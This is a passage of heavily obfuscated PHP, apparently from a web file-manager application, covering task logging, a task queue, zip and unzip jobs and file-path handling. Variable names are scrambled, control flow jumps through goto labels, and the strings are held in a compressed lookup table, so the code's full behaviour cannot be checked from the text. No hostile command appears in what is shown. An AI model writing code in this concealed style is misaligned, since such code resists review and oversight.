$this->add($µ¬À®öá); } protected function remove($¸åŞ³Âñ) { $ Şéóèë =& $_SERVER[ŒÅŸ‹ä†]; $©€õæüò = array($ Şéóèë[1911] => USER_ID, $ Şéóèë[513] => $¸åŞ³Âñ); return $this->where($©€õæüò)->delete(); } protected function removeByName($¯ˆãÌ÷û) { $ğñîÁñ¬ =& $_SERVER[ŒÅŸ‹ä†]; $¯úÚ†‘ = array($ğñîÁñ¬[1911] => USER_ID, $ğñîÁñ¬[514] => $¯ˆãÌ÷û, $ğñîÁñ¬[578] => 0); return $this->where($¯úÚ†‘)->delete(); } protected function rename($‡ş˜Š½ñ, $É™¬ì‚³) { $ »êá«Û =& $_SERVER[ŒÅŸ‹ä†]; if ($‡ş˜Š½ñ == $É™¬ì‚³) { return !1; } $Ÿ´âŠò¿ = $this->getAutoName($É™¬ì‚³); if ($É™¬ì‚³ != $Ÿ´âŠò¿) { return !1; } $î’ê¤¨Ø = array($ »êá«Û[1911] => USER_ID, $ »êá«Û[578] => 0, $ »êá«Û[42] => $‡ş˜Š½ñ); return $this->where($î’ê¤¨Ø)->save(array($ »êá«Û[42] => $É™¬ì‚³)); } protected function resetSort($ì‘ÏØÆ) { $“ –ÕŸ =& $_SERVER[ŒÅŸ‹ä†]; $ì‘ÏØÆ = is_array($ì‘ÏØÆ) ? $ì‘ÏØÆ : array(); $Ï¨œäÅÕ = array($“ –ÕŸ[1911] => USER_ID); for ($‰¹åÖÓ§ = 0; $‰¹åÖÓ§ < count($ì‘ÏØÆ); $‰¹åÖÓ§++) { $Ï¨œäÅÕ[$“ –ÕŸ[513]] = $ì‘ÏØÆ[$‰¹åÖÓ§]; $this->where($Ï¨œäÅÕ)->save(array($“ –ÕŸ[2130] => $‰¹åÖÓ§ + 1)); } return !0; } protected function moveTop($ØÁŒûë¬) { $‡ßò²¥¾ =& $_SERVER[ŒÅŸ‹ä†]; $ĞİşÙò = array($‡ßò²¥¾[1911] => USER_ID, $‡ßò²¥¾[578] => 0); $ÏÖ¸ßæ± = $this->where($ĞİşÙò)->where(array($‡ßò²¥¾[42] => $ØÁŒûë¬))->find(); if (!$ÏÖ¸ßæ±) { return; } $· ˜Ï´• = $this->field($‡ßò²¥¾[492])->where($ĞİşÙò)->order($‡ßò²¥¾[2620])->select(); $· ˜Ï´• = array_to_keyvalue($· ˜Ï´•, $‡ßò²¥¾[12], $‡ßò²¥¾[492]); $îéôß›ï = $· ˜Ï´•; $· ˜Ï´• = array_remove_value($· ˜Ï´•, $ÏÖ¸ßæ±[$‡ßò²¥¾[492]]); array_unshift($· ˜Ï´•, $ÏÖ¸ßæ±[$‡ßò²¥¾[492]]); return $this->resetSort($· ˜Ï´•); } protected function moveBottom($°ÆÁù) { $¶Ü“¢Ş =& $_SERVER[ŒÅŸ‹ä†]; $í›úÃı¥ = array($¶Ü“¢Ş[1911] => USER_ID, $¶Ü“¢Ş[578] => 0); $Óìæ¼‡‘ = $this->where($í›úÃı¥)->max($¶Ü“¢Ş[2148]); $¿³ûù» = array($¶Ü“¢Ş[2148] => $Óìæ¼‡‘ + 1); return $this->where($í›úÃı¥)->where(array($¶Ü“¢Ş[42] => $°ÆÁù))->save($¿³ûù»); } private function getAutoName($—ÜŠØø©) { $şÏè—ÈÏ =& $_SERVER[ŒÅŸ‹ä†]; $¼Œ£³§ = array($şÏè—ÈÏ[1911] => USER_ID, $şÏè—ÈÏ[578] => 0); $Ä´ç²½ = $this->field($şÏè—ÈÏ[42])->where($¼Œ£³§)->select(); $Ä´ç²½ = array_to_keyvalue($Ä´ç²½, $şÏè—ÈÏ[12], $şÏè—ÈÏ[42]); if (!$Ä´ç²½ || !in_array($—ÜŠØø©, $Ä´ç²½)) { return $—ÜŠØø©; } for ($¦şéËÏô = 0; $¦şéËÏô < count($Ä´ç²½); $¦şéËÏô++) { if (!in_array($—ÜŠØø© . "\50{$¦şéËÏô}\51", $Ä´ç²½)) { return $—ÜŠØø© . "\x28{$¦şéËÏô}\x29"; } } return $—ÜŠØø© . "\50{$¦şéËÏô}\51"; } } goto c™ïÒ¹ñİŠ; aˆ’Š¿–õ°: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($â©ÌËº¥, $¯ˆ˜Õñ÷ = '', $…¢şÒöİ = 0, $ ì”ø“¦ = '') { $¥œµë‰ =& $_SERVER[ŒÅŸ‹ä†]; $ ì”ø“¦ = $ ì”ø“¦ ? $ ì”ø“¦ : ($¯ˆ˜Õñ÷ ? $¯ˆ˜Õñ÷ : $â©ÌËº¥); $ÊÕÕ±ÁÒ = new Task($â©ÌËº¥, $¯ˆ˜Õñ÷, $…¢şÒöİ, $ ì”ø“¦); $GLOBALS[$¥œµë‰[2012] . $â©ÌËº¥] = new TaskLog($¥œµë‰[1904], $ÊÕÕ±ÁÒ, $ ì”ø“¦); return $ÊÕÕ±ÁÒ; } public function __construct($ñ–ÃÃˆ = '', $¨¸ÒÎˆú = '', $‰×Ğäï© = '') { $úÏøœ« =& $_SERVER[ŒÅŸ‹ä†]; if (!$ñ–ÃÃˆ) { $ñ–ÃÃˆ = $úÏøœ«[1904]; } $Ä¹ÊâëË = $ñ–ÃÃˆ . $úÏøœ«[482] . rand_string(10); if (!$‰×Ğäï©) { $‰×Ğäï© = $ñ–ÃÃˆ . $úÏøœ«[63] . $‰×Ğäï©; } switch ($ñ–ÃÃˆ) { case $úÏøœ«[1904]: if (!$¨¸ÒÎˆú || !$¨¸ÒÎˆú->task) { return echoLog($ñ–ÃÃˆ . $úÏøœ«[2013]); } $ã½Ÿøöô = $¨¸ÒÎˆú; $Ä¹ÊâëË = $ã½Ÿøöô->task[$úÏøœ«[492]]; $ñ–ÃÃˆ = $ã½Ÿøöô->task[$úÏøœ«[492]]; if (!$ã½Ÿøöô->task[$úÏøœ«[1808]]) { $ã½Ÿøöô->task[$úÏøœ«[1808]] = $‰×Ğäï© ? $‰×Ğäï© : $ñ–ÃÃˆ; } break; case $úÏøœ«[2014]: if (!$¨¸ÒÎˆú) { return echoLog($ñ–ÃÃˆ . $úÏøœ«[2015]); } $©ƒ×ŸƒÇ = is_string($¨¸ÒÎˆú) ? array($¨¸ÒÎˆú) : $¨¸ÒÎˆú; $ã½Ÿøöô = new TaskFileTransfer($Ä¹ÊâëË, $ñ–ÃÃˆ, 0, $‰×Ğäï© ? $‰×Ğäï© : $©ƒ×ŸƒÇ[0]); foreach ($©ƒ×ŸƒÇ as $ìû–Æ’¤) { $ã½Ÿøöô->addPath($ìû–Æ’¤); } break; case $úÏøœ«[398]: if (!$¨¸ÒÎˆú) { return echoLog($ñ–ÃÃˆ . $úÏøœ«[2015]); } $©ƒ×ŸƒÇ = is_string($¨¸ÒÎˆú) ? array($¨¸ÒÎˆú) : $¨¸ÒÎˆú; $ã½Ÿøöô = new TaskZip($Ä¹ÊâëË, $ñ–ÃÃˆ, 0, $‰×Ğäï© ? $‰×Ğäï© : $©ƒ×ŸƒÇ[0]); foreach ($©ƒ×ŸƒÇ as $ìû–Æ’¤) { $ã½Ÿøöô->addPath($ìû–Æ’¤); } break; case $úÏøœ«[1346]: if (!$¨¸ÒÎˆú) { return echoLog($ñ–ÃÃˆ . $úÏøœ«[2015]); } $ã½Ÿøöô = new TaskUnZip($Ä¹ÊâëË, $ñ–ÃÃˆ, 0, $‰×Ğäï© ? $‰×Ğäï© : $¨¸ÒÎˆú); if ($¨¸ÒÎˆú) { $ã½Ÿøöô->addFile($¨¸ÒÎˆú); } break; case $úÏøœ«[160]: $ã½Ÿøöô = new TaskHttp($Ä¹ÊâëË, $ñ–ÃÃˆ); break; default: return; break; } $this->task = $ã½Ÿøöô; $this->taskID = $Ä¹ÊâëË; Hook::bind($úÏøœ«[1940], array($this, $úÏøœ«[2016])); Hook::bind($úÏøœ«[1942], array($this, $úÏøœ«[2017])); Hook::bind($úÏøœ«[1936], array($this, $úÏøœ«[2018])); echoLog($úÏøœ«[2019] . $ã½Ÿøöô->task[$úÏøœ«[1808]]); } public function __destruct() { $this->end(); } public function end($ä¦ôÀ‘ = '') { $¾ÉÂŸ— =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ä¦ôÀ‘); $this->task = !1; $this->taskID = !1; Hook::unbind($¾ÉÂŸ—[1940], array($this, $¾ÉÂŸ—[2016])); Hook::unbind($¾ÉÂŸ—[1942], array($this, $¾ÉÂŸ—[2017])); Hook::unbind($¾ÉÂŸ—[1936], array($this, $¾ÉÂŸ—[2018])); } public function taskUpdate($™ƒ§ªÛ‰) { $Å´±íœš =& $_SERVER[ŒÅŸ‹ä†]; if (!$™ƒ§ªÛ‰ || $this->taskID != $™ƒ§ªÛ‰[$Å´±íœš[492]]) { return; } $ê»şóÓ = 20; $ìµáá»¼ = intval($™ƒ§ªÛ‰[$Å´±íœš[1921]] * $ê»şóÓ); $ğê—¤Å˜ = $Å´±íœš[184] . str_repeat($Å´±íœš[473], $ìµáá»¼) . $Å´±íœš[1125] . str_repeat($Å´±íœš[63], $ê»şóÓ - $ìµáá»¼) . $Å´±íœš[186]; $ö¾Î‚‘Ã = $ğê—¤Å˜ . sprintf($Å´±íœš[2020], $™ƒ§ªÛ‰[$Å´±íœš[1921]] * 100) . $Å´±íœš[2021]; $Šƒ×é¬î = $ö¾Î‚‘Ã . $™ƒ§ªÛ‰[$Å´±íœš[1920]] . $Å´±íœš[8] . $™ƒ§ªÛ‰[$Å´±íœš[1173]] . LNG($Å´±íœš[2022]); $ò÷Á¿Œê = $Å´±íœš[12]; if ($™ƒ§ªÛ‰[$Å´±íœš[2006]]) { $Šƒ×é¬î = $ö¾Î‚‘Ã . size_format($™ƒ§ªÛ‰[$Å´±íœš[1920]]) . $Å´±íœš[8] . size_format($™ƒ§ªÛ‰[$Å´±íœš[1173]]); $ò÷Á¿Œê = size_format($™ƒ§ªÛ‰[$Å´±íœš[1922]]) . $Å´±íœš[2023]; } if ($™ƒ§ªÛ‰[$Å´±íœš[1175]]) { $™ƒ§ªÛ‰[$Å´±íœš[1971]] = $™ƒ§ªÛ‰[$Å´±íœš[1175]] . $Å´±íœš[63] . $™ƒ§ªÛ‰[$Å´±íœš[1971]]; } if ($™ƒ§ªÛ‰[$Å´±íœš[1971]]) { $ÊÈÌ“şè = $Å´±íœš[12]; if ($™ƒ§ªÛ‰[$Å´±íœš[1973]]) { $ÊÈÌ“şè = $Å´±íœš[60] . size_format($™ƒ§ªÛ‰[$Å´±íœš[1974]]) . $Å´±íœš[8] . size_format($™ƒ§ªÛ‰[$Å´±íœš[1973]]); } $ò÷Á¿Œê .= $™ƒ§ªÛ‰[$Å´±íœš[1971]] . $ÊÈÌ“şè; } if ($™ƒ§ªÛ‰[$Å´±íœš[860]] && !$™ƒ§ªÛ‰[$Å´±íœš[1973]]) { $ò÷Á¿Œê .= $Å´±íœš[63] . size_format($™ƒ§ªÛ‰[$Å´±íœš[1978]]) . $Å´±íœš[8] . size_format($™ƒ§ªÛ‰[$Å´±íœš[860]]); } echoLog($Šƒ×é¬î . $Å´±íœš[63] . $ò÷Á¿Œê, !0); } public function taskEnd($Âç¡•ë) { $ÙÄ–÷Êì =& $_SERVER[ŒÅŸ‹ä†]; if (!$Âç¡•ë || $this->taskID != $Âç¡•ë[$ÙÄ–÷Êì[492]]) { return; } $°Åş‰“™ = $Âç¡•ë ? LNG($ÙÄ–÷Êì[2024]) . $ÙÄ–÷Êì[4] . $Âç¡•ë[$ÙÄ–÷Êì[1920]] . $ÙÄ–÷Êì[8] . $Âç¡•ë[$ÙÄ–÷Êì[1173]] . LNG($ÙÄ–÷Êì[2022]) . $ÙÄ–÷Êì[84] : $ÙÄ–÷Êì[12]; echoLog($ÙÄ–÷Êì[2025] . $Âç¡•ë[$ÙÄ–÷Êì[1808]] . ($Âç¡•ë[$ÙÄ–÷Êì[545]] ? $ÙÄ–÷Êì[84] . $Âç¡•ë[$ÙÄ–÷Êì[545]] : $ÙÄ–÷Êì[12]) . $ÙÄ–÷Êì[84] . $°Åş‰“™ . $ÙÄ–÷Êì[2026] . sprintf($ÙÄ–÷Êì[959], timeFloat() - $Âç¡•ë[$ÙÄ–÷Êì[1923]]) . $ÙÄ–÷Êì[1935]); $this->end(); } public function taskKill($…Ùà¾¶œ) { $ºü¿•¿˜ =& $_SERVER[ŒÅŸ‹ä†]; if (!$…Ùà¾¶œ || $this->taskID != $…Ùà¾¶œ[$ºü¿•¿˜[492]]) { return; } echoLog($ºü¿•¿˜[2027] . $…Ùà¾¶œ[$ºü¿•¿˜[1808]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\165\145\x75\x65\114\145\156\147\164\150"; const QUEUE_DATA = "\164\141\163\x6b\x51\x75\x65\x75\x65\104\141\x74\141"; const QUEUE_TIME = "\x74\141\x73\153\121\x75\x65\165\145\114\141\163\x74\x52\165\156"; const QUEUE_THREAD = "\164\x61\x73\x6b\121\x75\x65\165\x65\x54\x68\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Í© ¢Ÿú, $Ê²ÏÈµÎ = array(), $ûÂ™¥“û = '', $–âÕÌÁ· = '') { $ä·îãˆä =& $_SERVER[ŒÅŸ‹ä†]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($–âÕÌÁ· && array_find_by_field(self::$listData, $ä·îãˆä[105], $–âÕÌÁ·)) { return !0; } if ($–âÕÌÁ· && array_find_by_field(self::$listDataAdd, $ä·îãˆä[105], $–âÕÌÁ·)) { return !0; } self::$listDataAdd[] = array($ä·îãˆä[352] => $Í© ¢Ÿú, $ä·îãˆä[2028] => $Ê²ÏÈµÎ, $ä·îãˆä[545] => $ûÂ™¥“û, $ä·îãˆä[105] => $–âÕÌÁ·); return !0; } public static function addSubmit() { $û•Ÿ£òú =& $_SERVER[ŒÅŸ‹ä†]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($û•Ÿ£òú[2029] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $û•Ÿ£òú[12], $û•Ÿ£òú[545])), $û•Ÿ£òú[206]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÁÕúÃ‹, $Ì½ÛÏŠß = array(), $ĞÔŠ·åı = '', $  £Ú²Í = '') { $”ªµ™• =& $_SERVER[ŒÅŸ‹ä†]; if (self::count() >= self::MAX_LENGTH) { return !1; } $à€È†· = self::getAll(); if ($  £Ú²Í && array_find_by_field($à€È†·, $”ªµ™•[105], $  £Ú²Í)) { return !0; } $à€È†·[] = array($”ªµ™•[352] => $ÁÕúÃ‹, $”ªµ™•[2028] => $Ì½ÛÏŠß, $”ªµ™•[545] => $ĞÔŠ·åı, $”ªµ™•[105] => $  £Ú²Í); self::setAll($à€È†·); write_log($”ªµ™•[2029] . $ĞÔŠ·åı, $”ªµ™•[206]); return !0; } public static function run() { $òŞĞÏË‡ =& $_SERVER[ŒÅŸ‹ä†]; $ÍñÇÌÁÜ = self::getAll(); $èı·ò¼¸ = array_shift($ÍñÇÌÁÜ); if (!$èı·ò¼¸) { return !1; } self::setAll($ÍñÇÌÁÜ); $©ÀÇó”‚ = timeFloat(); $õòÀ”‹Ç = $òŞĞÏË‡[12]; try { $õòÀ”‹Ç = Hook::apply($èı·ò¼¸[$òŞĞÏË‡[352]], $èı·ò¼¸[$òŞĞÏË‡[2028]]); } catch (Exception $ÁÛ İŒÛ) { write_log($ÁÛ İŒÛ, $òŞĞÏË‡[1312]); } $÷Åê§ÅÆ = number_format(timeFloat() - $©ÀÇó”‚, 3) . $òŞĞÏË‡[1935]; if ($õòÀ”‹Ç && is_string($õòÀ”‹Ç)) { $÷Åê§ÅÆ = $÷Åê§ÅÆ . $òŞĞÏË‡[2030] . $õòÀ”‹Ç; } write_log($òŞĞÏË‡[2031] . $èı·ò¼¸[$òŞĞÏË‡[545]] . $òŞĞÏË‡[2032] . $÷Åê§ÅÆ, $òŞĞÏË‡[206]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ìŠ„ÎñÊ =& $_SERVER[ŒÅŸ‹ä†]; $Ê·Ù“ç = self::threadCount() + 1; if ($Ê·Ù“ç > 3 || !self::count()) { return; } write_log($ìŠ„ÎñÊ[2033] . $Ê·Ù“ç, $ìŠ„ÎñÊ[206]); Cache::set(self::QUEUE_THREAD, $Ê·Ù“ç, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ìŠ„ÎñÊ[2034], $ìŠ„ÎñÊ[206]); } public static function getKey($şû®Ç’, $ÇÚ¡Êúê = "\151\156\x74") { $¥ë¾óÛÃ =& $_SERVER[ŒÅŸ‹ä†]; Cache::removeMemory($şû®Ç’); $ù‹™•· = Cache::get($şû®Ç’); if ($ÇÚ¡Êúê == $¥ë¾óÛÃ[374]) { return $ù‹™•· ? intval($ù‹™•·) : 0; } if ($ÇÚ¡Êúê == $¥ë¾óÛÃ[2035]) { return is_array($ù‹™•·) ? $ù‹™•· : array(); } return $ù‹™•·; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ŒÅŸ‹ä†][2035]); } public static function setAll($ØÚ¯ñ) { $›éïªÌ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ØÚ¯ñ), $›éïªÌ); Cache::set(self::QUEUE_DATA, $ØÚ¯ñ, $›éïªÌ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($îÂÉ‹äë, $¥åƒœŒº = 5.0) { if (!$îÂÉ‹äë) { return; } $ƒÀÒÑØ = Cache::get($îÂÉ‹äë); if (!$ƒÀÒÑØ || timeFloat() - floatVal($ƒÀÒÑØ) >= $¥åƒœŒº) { Cache::set($îÂÉ‹äë, timeFloat(), $¥åƒœŒº * 10); return !0; } return !1; } public static function timeLimitCall($Š‡…Ğ÷Ü, $ÌªÕªû¾, $«…ŠåË…, $Í²ïÏ¾Â = 5.0) { $Ğ¤éˆÏ¾ =& $_SERVER[ŒÅŸ‹ä†]; if (!$Š‡…Ğ÷Ü || !$ÌªÕªû¾) { return; } self::$asyncAdd = !0; $°ôŒ±÷º = $Ğ¤éˆÏ¾[2036]; $ê¤µøõ = Cache::get($°ôŒ±÷º, !0); $÷‘¿·¥Ö = array($Ğ¤éˆÏ¾[2037] => timeFloat(), $Ğ¤éˆÏ¾[2038] => timeFloat(), $Ğ¤éˆÏ¾[352] => $ÌªÕªû¾, $Ğ¤éˆÏ¾[2028] => $«…ŠåË…, $Ğ¤éˆÏ¾[2039] => $Í²ïÏ¾Â); if (is_array($ê¤µøõ[$Š‡…Ğ÷Ü])) { if (timeFloat() - $ê¤µøõ[$Š‡…Ğ÷Ü][$Ğ¤éˆÏ¾[2037]] <= $÷‘¿·¥Ö[$Ğ¤éˆÏ¾[2039]] * 0.5) { return; } $÷‘¿·¥Ö[$Ğ¤éˆÏ¾[2038]] = $ê¤µøõ[$Š‡…Ğ÷Ü][$Ğ¤éˆÏ¾[2038]]; } $ê¤µøõ[$Š‡…Ğ÷Ü] = $÷‘¿·¥Ö; Cache::set($°ôŒ±÷º, $ê¤µøõ, 60); Cache::removeMemory($°ôŒ±÷º); write_log($Ğ¤éˆÏ¾[2040] . $Š‡…Ğ÷Ü . $Ğ¤éˆÏ¾[84] . $ÌªÕªû¾ . $Ğ¤éˆÏ¾[2041] . ACTION, $Ğ¤éˆÏ¾[206]); } public static function timeLimitCallLoop() { $ŠÂ‰•É˜ =& $_SERVER[ŒÅŸ‹ä†]; $”Â¬™¨Í = array($ŠÂ‰•É˜[2042]); $Ê‹µ’Ë° = in_array(strtolower(ACTION), $”Â¬™¨Í); if (!$Ê‹µ’Ë° && !self::$asyncAdd) { return; } $ïßä×ï– = $ŠÂ‰•É˜[2036]; $Î½è«ŸÜ = Cache::get($ïßä×ï–, !0); if (!$Î½è«ŸÜ || count($Î½è«ŸÜ) <= 0) { return; } $Ã°€Èê° = timeFloat(); $ØÖ®ØÍï = array(); $€’ìŞ = array(); foreach ($Î½è«ŸÜ as $ûÇÔ»ˆó => $¶ôŸÃó¾) { if ($Ã°€Èê° - $¶ôŸÃó¾[$ŠÂ‰•É˜[2038]] > $¶ôŸÃó¾[$ŠÂ‰•É˜[2039]]) { $€’ìŞ[$ûÇÔ»ˆó] = $¶ôŸÃó¾; continue; } $ØÖ®ØÍï[$ûÇÔ»ˆó] = $¶ôŸÃó¾; } if (count($€’ìŞ) == 0) { return; } if (count($ØÖ®ØÍï) == 0) { Cache::remove($ïßä×ï–); } else { Cache::set($ïßä×ï–, $ØÖ®ØÍï, 60); } Cache::removeMemory($ïßä×ï–); self::runArr($€’ìŞ); } public static function finished($½§€şÖ˜, $—ÜÍï­) { $ÒÜœ¶Œ =& $_SERVER[ŒÅŸ‹ä†]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÒÜœ¶Œ[352] => $½§€şÖ˜, $ÒÜœ¶Œ[2028] => $—ÜÍï­); } private static function runArr($¼ÕÊì”š) { $åÆ†Ëñ =& $_SERVER[ŒÅŸ‹ä†]; if (!$¼ÕÊì”š) { return; } foreach ($¼ÕÊì”š as $Äù²ãâ÷ => $Ôñ­™ˆñ) { try { Hook::apply($Ôñ­™ˆñ[$åÆ†Ëñ[352]], $Ôñ­™ˆñ[$åÆ†Ëñ[2028]]); write_log($åÆ†Ëñ[2043] . $Äù²ãâ÷ . $åÆ†Ëñ[84] . $Ôñ­™ˆñ[$åÆ†Ëñ[352]] . $åÆ†Ëñ[2041] . ACTION, $åÆ†Ëñ[206]); } catch (Exception $‚Î”ùõ¡) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto fì¿¢¥©é; BÊ‡š†á®Â: define($_SERVER[ŒÅŸ‹ä†][0], $_SERVER[ŒÅŸ‹ä†][1]); $_SERVER[ïığÌï] = explode($_SERVER[ŒÅŸ‹ä†][2], gzinflate(substr($_SERVER[ŒÅŸ‹ä†][3], 10, -8))); function binCheckEq($’³ƒóÌ÷, $à²ÕÈ‘) { return $’³ƒóÌ÷ == $à²ÕÈ‘; } goto eæ‰ÉÅç´Â; F·µÁÌ‰‚: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65\137\143\157\156\164\x65\x6e\164\163"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\x69\155\x65", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\x66\x75\156\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\145" => "\x69\x6f\x5f\146\x69\x6c\x65\137\155\x65\164\x61", "\x6d\145\x74\141\106\x69\x65\x6c\144" => "\146\151\154\x65\x49\x44"); public function fileInfo($Ø¤ı¨Í—) { $…µÚˆ¿Ç =& $_SERVER[ŒÅŸ‹ä†]; static $İäíëª = array(); if (!isset($İäíëª[$Ø¤ı¨Í—])) { $Œ‰ıŒ… = $…µÚˆ¿Ç[2175]; $…›„­ù‰ = Model($…µÚˆ¿Ç[565])->field($Œ‰ıŒ…)->where(array($…µÚˆ¿Ç[563] => $Ø¤ı¨Í—))->find(); $İäíëª[$Ø¤ı¨Í—] = $…›„­ù‰; } return $İäíëª[$Ø¤ı¨Í—]; } public function addFileByContent($ˆ¾«İºŒ = '', $¦èÒõè³, $“é†Æ²Û = '') { $¶ıüÆìæ =& $_SERVER[ŒÅŸ‹ä†]; $¸²üöÆÎ = TEMP_PATH . $¶ıüÆìæ[2176]; if (!is_dir($¸²üöÆÎ)) { mk_dir($¸²üöÆÎ); } $ËÒ®³Ú³ = $¸²üöÆÎ . $¶ıüÆìæ[2177] . rand_string(16); $³ÖïØ„ = file_put_contents($ËÒ®³Ú³, $ˆ¾«İºŒ); if ($³ÖïØ„ === !1 || strlen($ˆ¾«İºŒ) != $³ÖïØ„) { return !1; } $Ì¾óäøÙ = $this->addFile($ËÒ®³Ú³, $¦èÒõè³, $“é†Æ²Û, !0); if (file_exists($ËÒ®³Ú³)) { @unlink($ËÒ®³Ú³); } return $Ì¾óäøÙ; } public function createFileName($¦‡”…âú, $İÍÅßë¸, $õæ©¬İ = false, $£ĞŞÑŞî = false) { $²Ï¬Ô ¤ =& $_SERVER[ŒÅŸ‹ä†]; $¬… ØÄ = IO::init($²Ï¬Ô ¤[8]); $ù•œ»°ç = $this->_makeFilePath($¦‡”…âú, $İÍÅßë¸, $¬… ØÄ, $õæ©¬İ, $£ĞŞÑŞî); $Ñø¯£Øò = $¬… ØÄ->pathFather($ù•œ»°ç); static $úîÏ²˜‘ = false; $–áÊÆ¹Ã = $²Ï¬Ô ¤[2178] . md5($Ñø¯£Øò); if (!$úîÏ²˜‘ && !Cache::get($–áÊÆ¹Ã)) { $úîÏ²˜‘ = !0; $û¸‡­Î÷ = IO::mkdir($Ñø¯£Øò); if (!IO::exist($û¸‡­Î÷ . $²Ï¬Ô ¤[898])) { IO::mkfile($û¸‡­Î÷ . $²Ï¬Ô ¤[898]); } Cache::set($–áÊÆ¹Ã, 1, 3600 * 2); } return $ù•œ»°ç; } public function _makeFilePath($Î—¤Åï¤, $ÑÓŠ‹«Ç, $ãğêÛ×, $óäÎ÷Ÿß = false, $şé”ĞŒ = false) { $Î¡ËÜ÷ª =& $_SERVER[ŒÅŸ‹ä†]; $ÊøÊìúû = Model($Î¡ËÜ÷ª[869])->get($Î¡ËÜ÷ª[2179]); $îëğ¹«° = $Î¡ËÜ÷ª[1369] . $ÑÓŠ‹«Ç[$Î¡ËÜ÷ª[492]] . $Î¡ËÜ÷ª[504] . date($Î¡ËÜ÷ª[2180]); $‡›¹’Ñ° = $îëğ¹«° . rand_string(5) . short_id(100); $Î—¤Åï¤ = str_replace($Î¡ËÜ÷ª[8], $Î¡ËÜ÷ª[11], KodIO::clear($Î—¤Åï¤)); $¼ÊûŞï‹ = $ãğêÛ×->ext($Î—¤Åï¤); if (!$Î—¤Åï¤) { $ÊøÊìúû = $Î¡ËÜ÷ª[875]; } switch ($ÊøÊìúû) { case $Î¡ËÜ÷ª[2181]: if ($¼ÊûŞï‹) { $‡›¹’Ñ° = $‡›¹’Ñ° . $Î¡ËÜ÷ª[10] . $¼ÊûŞï‹; } if ($¼ÊûŞï‹ == $Î¡ËÜ÷ª[2119]) { $‡›¹’Ñ° .= $Î¡ËÜ÷ª[1338]; } break; case $Î¡ËÜ÷ª[2182]: $ë¶Šö”¤ = Model($Î¡ËÜ÷ª[869])->get($Î¡ËÜ÷ª[870]); $‚‚ø­Ô§ = substr(md5($Î¡ËÜ÷ª[871] . $ë¶Šö”¤ . date($Î¡ËÜ÷ª[845])), 0, 8); $îëğ¹«° = $Î¡ËÜ÷ª[1369] . $ÑÓŠ‹«Ç[$Î¡ËÜ÷ª[492]] . $Î¡ËÜ÷ª[504] . date($Î¡ËÜ÷ª[2183]) . $‚‚ø­Ô§ . $Î¡ËÜ÷ª[8]; if ($¼ÊûŞï‹ == $Î¡ËÜ÷ª[2119]) { $Î—¤Åï¤ .= $Î¡ËÜ÷ª[1338]; } $¸¢ğ¹µ = $Î¡ËÜ÷ª[2184] . $îëğ¹«° . $Î—¤Åï¤; CacheLock::lock($¸¢ğ¹µ); $‡›¹’Ñ° = $îëğ¹«° . $Î—¤Åï¤; if (IO::exist($îëğ¹«° . $Î—¤Åï¤)) { $îİ‡¬®‹ = substr($Î—¤Åï¤, 0, strlen($Î—¤Åï¤) - strlen($¼ÊûŞï‹)); $ ˜î„õ° = $şé”ĞŒ ? substr($şé”ĞŒ, 0, 5) : ($óäÎ÷Ÿß ? substr($óäÎ÷Ÿß, 0, 5) : rand_string(5)); $ ˜î„õ° .= rand_string(3); $‡›¹’Ñ° = $îëğ¹«° . $îİ‡¬®‹ . $ ˜î„õ°; if ($¼ÊûŞï‹) { $‡›¹’Ñ° = $‡›¹’Ñ° . $Î¡ËÜ÷ª[10] . $¼ÊûŞï‹; } } if (IO::isOsDriver($‡›¹’Ñ°) && !IO::isUploadServer($‡›¹’Ñ°)) { if (IO::exist($‡›¹’Ñ°)) { CacheLock::unlock($¸¢ğ¹µ); return $‡›¹’Ñ°; } $´Î§æ´‘ = IO::setContent($‡›¹’Ñ°, $Î¡ËÜ÷ª[12]); if (!$´Î§æ´‘) { show_json($Î¡ËÜ÷ª[2185], !1); } } CacheLock::unlock($¸¢ğ¹µ); break; case $Î¡ËÜ÷ª[875]: break; default: break; } return $‡›¹’Ñ°; } public function addFileByRemote($‘ïğÜÉÆ, $’©—€Æ², $‘ÂòÃºó = array()) { $¶Á…Âï =& $_SERVER[ŒÅŸ‹ä†]; if (!IO::isFile($‘ïğÜÉÆ)) { return !1; } $ïô·ÌıÀ = $‘ÂòÃºó[$¶Á…Âï[568]] ? $‘ÂòÃºó[$¶Á…Âï[568]] : $¶Á…Âï[12]; $¨ÕÁ¾÷½ = IO::hashMd5($‘ïğÜÉÆ, $ïô·ÌıÀ); $«ùûâ‰ß = KodIO::parse($‘ïğÜÉÆ); $‹•á½Ø­ 